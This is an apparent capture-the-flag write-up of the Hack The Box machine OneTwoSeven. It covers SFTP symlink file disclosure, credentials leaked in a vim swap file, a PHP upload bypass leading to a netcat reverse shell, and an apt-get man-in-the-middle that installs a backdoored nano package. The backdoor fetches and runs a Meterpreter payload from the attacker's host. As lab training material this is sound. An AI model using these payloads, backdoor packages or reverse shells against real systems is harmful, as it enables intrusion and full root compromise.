---
layout: single
title: Onetwoseven - Hack The Box
excerpt: "OneTwoSeven starts with enumeration of various files on the system by creating symlinks from the SFTP server. After finding the credentials for the ots-admin user in a vim swap file, I get access to the administration page by SSH port-forwarding my way in and then I have to use the addon manager to upload a PHP file and get RCE. The priv esc was pretty fun and unique: I had to perform a MITM attack against apt-get and upload a malicious package that executes arbitrary code as root."
date: 2019-08-31
classes: wide
header:
  teaser: /assets/images/htb-writeup-onetwoseven/onetwoseven_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - php
  - apt
  - mitm
  - swapfile
  - vim
  - sftp
  - ssh
  - port forwarding
  - sudo
  - web
  - linux
  - symlink
---

![](/assets/images/htb-writeup-onetwoseven/onetwoseven_logo.png)

OneTwoSeven starts with enumeration of various files on the system by creating symlinks from the SFTP server. After finding the credentials for the ots-admin user in a vim swap file, I get access to the administration page by SSH port-forwarding my way in and then I have to use the addon manager to upload a PHP file and get RCE. The priv esc was pretty fun and unique: I had to perform a MITM attack against apt-get and upload a malicious package that executes arbitrary code as root.

## Summary

- The sign up webpage provides SFTP credentials to the box
- From SFTP we can create a symlink to the root directory than access it with the browser and the home folder
- A vim swap file reveals the `ots-admin` password for the local administration page
- We can also retrieve the PHP source code of the main page via the symlink trick
- The local admin page can only be accessed from localhost but we can do port-tunneling with SSH to connect to it
- A file upload feature in a PHP web application can be accessed directly even if it's supposed to be disabled after encoding part of the URI
- We get RCE by uploading a PHP file to the site
- The `apt-get` update / upgrade command is in the sudoers file and runs as `root` without any password
- We can craft a malicious package and force the server to use our box as a proxy to do a man-in-the-middle attack against apt

## Details

### Portscan

Note: 60080 is filtered on the box, but may be listening locally. I'll keep an eye on this later on.

```
# nmap -sC -sV -p- 10.10.10.133
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-20 15:00 EDT
Nmap scan report for onetwoseven (10.10.10.133)
Host is up (0.0091s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
60080/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration

The website is some kind of hosting provider.

![](/assets/images/htb-writeup-onetwoseven/web1.png)

![](/assets/images/htb-writeup-onetwoseven/web2.png)

![](/assets/images/htb-writeup-onetwoseven/web3.png)

At the bottom of the main page there's a hint about throttling enforced on the system:

![](/assets/images/htb-writeup-onetwoseven/donkeys.png)

On the Attribution page, there's a note from the box creator confirming this: `Special thanks to 0xEA31 for the fail2ban configuration that already powered Lightweight and CTF.` Based on this information, I figure it's very likely that I don't need to run gobuster or do any heavy enumeration on the main page.

When I click the sign up button, I get a personal account created automatically and get the credentials for SFTP.

![](/assets/images/htb-writeup-onetwoseven/web4.png)

- Username: `ots-4NzkzMDE`
- Password: `ea879301`

The link to the user homepage is: `http://onetwoseven.htb/~ots-4NzkzMDE`

At the moment, there's nothing on the page except a brick background.

![](/assets/images/htb-writeup-onetwoseven/home1.png)

### Checking out the SFTP service

I can't connect using SSH because only SFTP is allowed on port 22:

```
# ssh ots-4NzkzMDE@10.10.10.133
ots-4NzkzMDE@10.10.10.133's password:
This service allows sftp connections only.
Connection to 10.10.10.133 closed.
```

I can log in with SFTP however:

```
# sftp ots-4NzkzMDE@10.10.10.133
ots-4NzkzMDE@10.10.10.133's password:
Connected to ots-4NzkzMDE@10.10.10.133.
sftp>
```

As expected the SFTP access provides a link to the user directory:

```
sftp> ls
public_html
sftp> cd public_html/
sftp> ls
index.html
```

### Gathering some files via symlink

I can create a symlink to the filesystem root directory with:

```
sftp> ln -s / root
sftp> ls -l
-rw-r--r--    1 1001     1001          349 Feb 15 21:03 index.html
lrwxrwxrwx    1 1001     1001            1 Apr 22 01:07 root
```

If I go in the `root` directory symlink I created, it returns me to the root of the SFTP.

```
sftp> cd root
sftp> ls
public_html
```

But with the web browser however, when I browse to `root` I see a bunch of folders:

![](/assets/images/htb-writeup-onetwoseven/symlink1.png)

I can't go into `etc`, `home` or `usr` because I get a `403 Forbidden` error message.

But `/var/www` shows there's two main web directories: `html-admin` and `html`.

![](/assets/images/htb-writeup-onetwoseven/symlink2.png)

`html` is the main webpage I saw earlier, but `html-admin` contains a couple of different files, including a vim swap file: `.login.php.swp`

![](/assets/images/htb-writeup-onetwoseven/symlink3.png)

```
# file .login.php.swp
.login.php.swp: Vim swap file, version 8.0, pid 1861, user root, host onetwoseven, file /var/www/html-admin/login.php
```

A swap file is a binary file so I ran `strings` on it to clean it up and make it readable in a text editor:

```
# strings .login.php.swp > login.php.swp
```

The file contains a bunch of interesting things:

```php
if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
[...]
<p>Administration backend. For administrators only.</p>
<h1>OneTwoSeven Administration</h1>
[...]
<?php session_start(); if (isset ($_SESSION['username'])) { header("Location: /menu.php"); } ?>
<?php if ( $_SERVER['SERVER_PORT'] != 60080 ) { die(); } ?>
[...]
```

- There's an `ots-admin` user with a sha256 hash that is easily crackable to `Homesweethome1`
- The page mentions this is some kind of administration backend webpage
- The page is supposed to be accessed on port 60080 (which is firewalled / not listening on the 10.10.10.133 IP address)

### Getting the user flag

I can get the source of all the PHP files from the main website by creating additional symlinks:

```
sftp> ln -s /var/www/html/signup.php signup.txt
sftp> ln -s /var/www/html/index.php index.txt
sftp> ln -s /var/www/html/stats.php stats.txt
sftp> rm index.html
Removing /public_html/index.html
```

![](/assets/images/htb-writeup-onetwoseven/symlink4.png)

The `signup.php` file is interesting because it contains the logic used to generate the username and password:

```php
<?php
function username() { $ip = $_SERVER['REMOTE_ADDR']; return "ots-" . substr(str_replace('=','',base64_encode(substr(md5($ip),0,8))),3); }
function password() { $ip = $_SERVER['REMOTE_ADDR']; return substr(md5($ip),0,8); }
?>
```

I can grab the `/etc/passwd` file by symlinking to it directly:

```
sftp> ln -s /etc/passwd passwd
```

The file contains another user with the `127.0.0.1` IP address:

```
ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false
ots-4NzkzMDE:x:1001:1001:10.10.14.23:/home/web/ots-4NzkzMDE:/bin/false
```

I have the source code of the signup page so I can find what the password is for this user. As shown previously, the password is a portion of the MD5 hash of the user IP address:

```
php > echo "ots-" . substr(str_replace('=','',base64_encode(substr(md5("127.0.0.1"),0,8))),3);
ots-yODc2NGQ
php > echo substr(md5("127.0.0.1"),0,8);
f528764d
```

Password: `f528764d`

I can SFTP in with that account and get the user flag:

```
# sftp ots-yODc2NGQ@10.10.10.133
ots-yODc2NGQ@10.10.10.133's password:
Connected to ots-yODc2NGQ@10.10.10.133.
sftp> ls
public_html  user.txt
sftp> get user.txt
Fetching /user.txt to user.txt
```

```
# cat user.txt
93a4ce...
```

### Pivoting to the local administration page

I'll use SSH tunneling to get access to port 60080 on the server. But I need to pass the `-N` flag to SSH so it does try to spawn a shell (because only SFTP is enabled).

```
# ssh -L 60080:127.0.0.1:60080 -N ots-yODc2NGQ@10.10.10.133
ots-yODc2NGQ@10.10.10.133's password:
```

I can now access the administration web page through my tunnel at `127.0.0.1:60080`

![](/assets/images/htb-writeup-onetwoseven/admin1.png)

I log in with `ots-admin` / `Homesweethome1`

![](/assets/images/htb-writeup-onetwoseven/admin2.png)

Most of the menu items just provide the output of some Linux commands like:

![](/assets/images/htb-writeup-onetwoseven/admin3.png)

The OTS Addon Manager menu item contains some information about rewrite rules:

![](/assets/images/htb-writeup-onetwoseven/admin4.png)

The `addon-upload.php` and `addon-download.php` files are redirected to `addons/ots-man-addon.php` based on the Apache rewrite rules.

Each addon has a `[DL]` link right next to it and I can download the PHP source code of every file.

I can download `ots-man-addon.php` by using specifying the `addon` parameter manually.

![](/assets/images/htb-writeup-onetwoseven/admin5.png)

### Getting a reverse shell through the addon manager

The interesting part of the `ots-man-addon.php` file is the upload functionality. This is the obvious target to upload some PHP file and gain remote code execution. The file contains a typical file upload functionality where the file uploaded gets moved into the current directory where the script is executed: `/addons`.

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS Addon Manager
switch (true) {
	# Upload addon to addons folder.
	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
		if(isset($_FILES['addon'])){
			$errors= array();
			$file_name = basename($_FILES['addon']['name']);
			$file_size =$_FILES['addon']['size'];
			$file_tmp =$_FILES['addon']['tmp_name'];

			if($file_size > 20000){
				$errors[]='Module too big for addon manager. Please upload manually.';
			}

			if(empty($errors)==true) {
				move_uploaded_file($file_tmp,$file_name);
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "File uploaded successfull.y";
			} else {
				header("Location: /menu.php");
				header("Content-Type: text/plain");
				echo "Error uploading the file: ";
				print_r($errors);
			}
        }
```

There's two gotchas however:
- The URI needs to contain `/addon-upload.php` for the proper switch branch to be taken
- `ots-man-addon.php` is not meant to be accessed directly from `/addons` but rather from `menu.php`. The `if( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); }` code prevents the PHP code from executing if `/addons/` is in the URI.

I can bypass the first item by adding a bogus parameter like `?a=/addon-upload.php`, and the second by URL encoding some of the characters in the URI.

The final HTTP request looks like this: `POST /%61ddons/ots-man-addon.php?a=/addon-upload.php`

![](/assets/images/htb-writeup-onetwoseven/upload.png)

![](/assets/images/htb-writeup-onetwoseven/upload2.png)

I now have RCE:

![](/assets/images/htb-writeup-onetwoseven/rce1.png)

Time to get a shell with a standard netcat reverse shell. I URL encoded the payload to avoid any issue: `GET 127.0.0.1:60080/addons/snowscan.php?cmd=rm %2ftmp%2ff%3bmkfifo %2ftmp%2ff%3bcat %2ftmp%2ff|%2fbin%2fsh -i 2>%261|nc 10.10.14.23 4444 >%2ftmp%2ff`

```
root@ragingunicorn:~/htb/onetwoseven# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.133.
Ncat: Connection from 10.10.10.133:41952.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=35(www-admin-data) gid=35(www-admin-data) groups=35(www-admin-data)
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-admin-data@onetwoseven:/var/www/html-admin/addons$ ^Z
[1]+  Stopped                 nc -lvnp 4444
root@ragingunicorn:~/htb/onetwoseven# stty raw -echo
fg
www-admin-data@onetwoseven:/var/www/html-admin/addons
```

### Priv esc using apt-get MITM

I see that `www-admin-data` can run `apt-get` as root without any password:

```
www-admin-data@onetwoseven:/$ sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

The box is running Devuan Linux, a Linux distro for hipsters who don't like systemd. Interestingly, there are two different apt sources configured:

```
www-admin-data@onetwoseven:/$ ls -l /etc/apt/sources.list.d
total 8
-rw-r--r-- 1 root root 211 Feb 15 17:22 devuan.list
-rw-r--r-- 1 root root 102 Feb 15 17:22 onetwoseven.list

www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
```

It's pretty clear here that I need to do some kind of Man-In-The-Middle (MITM) attack on the apt upgrade process.

I did some googling and found a nice blog explaining how to perform the MITM attack on apt-get: [https://versprite.com/blog/apt-mitm-package-injection/](https://versprite.com/blog/apt-mitm-package-injection/). I'm not gonna rehash the entire blog article here, but the main elements of my attack are shown below.

I pick nano as my target for a malicious package: `nano_3.0.0_amd64.deb`

The `postinst` adds a cronjob that executes `/bin/nano_backdoor` every 5 minutes:

```
#!/bin/sh

set -e

if [ "$1" = "configure" ] || [ "$1" = "abort-upgrade" ]; then
    update-alternatives --install /usr/bin/editor editor /bin/nano 40 \
      --slave /usr/share/man/man1/editor.1.gz editor.1.gz \
      /usr/share/man/man1/nano.1.gz
    update-alternatives --install /usr/bin/pico pico /bin/nano 10 \
      --slave /usr/share/man/man1/pico.1.gz pico.1.gz \
      /usr/share/man/man1/nano.1.gz
fi

crontab -l | { cat; echo "*/5 * * * * /bin/nano_backdoor "; } | crontab -
```

`nano_backdoor` just downloads and executes a shell script from my box:

```
#!/bin/sh
rm /tmp/snowscan.sh
wget http://10.10.14.23/snowscan.sh -O /tmp/snowscan.sh
chmod 777 /tmp/snowscan.sh
/tmp/snowscan.sh
```

The `/devuan/dists/ascii/Release` looks like this:

```
# cat Release
Origin: Devuan
Label: Devuan
Suite: stable
Version: 2.0
Codename: ascii
Date: Wed, 20 Apr 2019 05:00:00 UTC
Architectures:  amd64
Components: main contrib non-free raspi beaglebone droid4 n900 n950 n9 sunxi exynos
SHA256:
 947ab0bff476deda21dbab0c705b14211718ed357d5ca75e707bea4bdc762c59 770 main/binary-amd64/Packages
 7c18ea11cba4acd2a3fdcea314c2b816787cecc4aaad2ae75667553cf700769b 551 main/binary-amd64/Packages.xz
```

The `/devuan/dists/ascii/main/binary-amd64/Packages` file contains the modified version number, updated filename and checksums:

```
# cat Packages
Package: nano
Version: 3.0.0
Installed-Size: 2043
Maintainer: Jordi Mallach <jordi@debian.org>
Architecture: amd64
Replaces: pico
Provides: editor
Depends: libc6 (>= 2.14), libncursesw5 (>= 6), libtinfo5 (>= 6), zlib1g (>= 1:1.1.4)
Conflicts: pico
Homepage: https://www.nano-editor.org/
Description: small, friendly text editor inspired by Pico
Description-md5: 04397a7cc45e02bc3a9900a7fbed769c
Suggests: spell
Tag: implemented-in::c, interface::text-mode, role::program, scope::utility,
 suite::gnu, uitoolkit::ncurses, use::editing, works-with::text
Section: editors
Priority: important
Filename: pool/DEBIAN/main/n/nano/nano_3.0.0_amd64.deb
Size: 484680
MD5sum: 2aed07eb168f2dcafcc0f6311d33ace0
SHA256: 7f256355537f78c672d5f8aff6de00c63a026306df6e120b2ee8eaaa503d923c
```

Next I setup Burp to listen on all interfaces:

![](/assets/images/htb-writeup-onetwoseven/burp.png)

Then modify `/etc/hosts` to point the apt repositories to my own box:

```
127.0.0.1 packages.onetwoseven.htb de.deb.devuan.org
```

I can force the server to connect through my Kali VM by setting the `http_proxy` variable so it uses the Burp proxy. My local host file points the repo domain to 127.0.0.1 so it connects to my Python webserver.

```
www-admin-data@onetwoseven:/$ sudo http_proxy=http://10.10.14.23:8080 apt-get update
Ign:1 http://packages.onetwoseven.htb/devuan ascii InRelease
Ign:2 http://de.deb.devuan.org/merged ascii InRelease
Get:3 http://packages.onetwoseven.htb/devuan ascii Release [420 B]
Ign:4 http://de.deb.devuan.org/merged ascii-security InRelease
Ign:5 http://packages.onetwoseven.htb/devuan ascii Release.gpg
Ign:6 http://de.deb.devuan.org/merged ascii-updates InRelease
Err:7 http://de.deb.devuan.org/merged ascii Release
  404  File not found
Ign:8 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages
Err:9 http://de.deb.devuan.org/merged ascii-security Release
  404  File not found
Get:8 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages [770 B]
Err:10 http://de.deb.devuan.org/merged ascii-updates Release
  404  File not found
Reading package lists... Done
W: The repository 'http://packages.onetwoseven.htb/devuan ascii Release' is not signed.
N: Data from such a repository can't be authenticated and is therefore potentially dangerous to use.
N: See apt-secure(8) manpage for repository creation and user configuration details.
E: The repository 'http://de.deb.devuan.org/merged ascii Release' does no longer have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
E: The repository 'http://de.deb.devuan.org/merged ascii-security Release' does no longer have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
E: The repository 'http://de.deb.devuan.org/merged ascii-updates Release' does no longer have a Release file.
N: Updating from such a repository can't be done securely, and is therefore disabled by default.
N: See apt-secure(8) manpage for repository creation and user configuration details.
```

```
www-admin-data@onetwoseven:/$ sudo http_proxy=http://10.10.14.23:8080 apt-get upgrade
Reading package lists... Done
Building dependency tree
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  nano
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 485 kB of archives.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n] y
WARNING: The following packages cannot be authenticated!
  nano
Install these packages without verification? [y/N] y
Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 nano amd64 3.0.0 [485 kB]
Fetched 485 kB in 0s (4372 kB/s)
Reading changelogs... Done
debconf: unable to initialize frontend: Dialog
debconf: (Dialog frontend will not work on a dumb terminal, an emacs shell buffer, or without a controlling terminal.)
debconf: falling back to frontend: Readline
(Reading database ... 33940 files and directories currently installed.)
Preparing to unpack .../archives/nano_3.0.0_amd64.deb ...
Unpacking nano (3.0.0) over (2.7.4-1) ...
Setting up nano (3.0.0) ...
Processing triggers for man-db (2.7.6.1-2) ...
```

File has been installed, I can see the backdoored script file:

```
www-admin-data@onetwoseven:/$ ls -l /bin/nano*
-rwxr-xr-x 1 root root 225320 Jan 11  2017 /bin/nano
-r-xr-xr-x 1 root root    130 Apr 21 21:13 /bin/nano_backdoor
```

Next, I'll create a `snowscan.sh` file in the root of my Python webserver:

```
#!/bin/sh
wget http://10.10.14.23/met -O /tmp/met
chmod 777 /tmp/met
/tmp/met
```

Then I generate a Meterpreter payload to connect back to me when it gets executed by the cronjob:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LPORT=5555 LHOST=10.10.14.23
```

And finally once the cronjob runs, it downloads `snowscan.sh`, executes it and downloads the meterpreter binary so I can get a shell as root:

```
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > jobs

Jobs
====

No active jobs.

msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.23:5555
```

```
msf5 exploit(multi/handler) > [!] Stage encoding is not supported for linux/x64/meterpreter/reverse_tcp
[*] Sending stage (3021284 bytes) to 10.10.10.133
[*] Meterpreter session 2 opened (10.10.14.23:5555 -> 10.10.10.133:48542) at 2019-04-21 22:45:41 -0400

msf5 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > shell
Process 13981 created.
Channel 1 created.
python -c 'import pty;pty.spawn("/bin/bash")'
root@onetwoseven:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@onetwoseven:~# cat /root/root.txt
2d380a...
```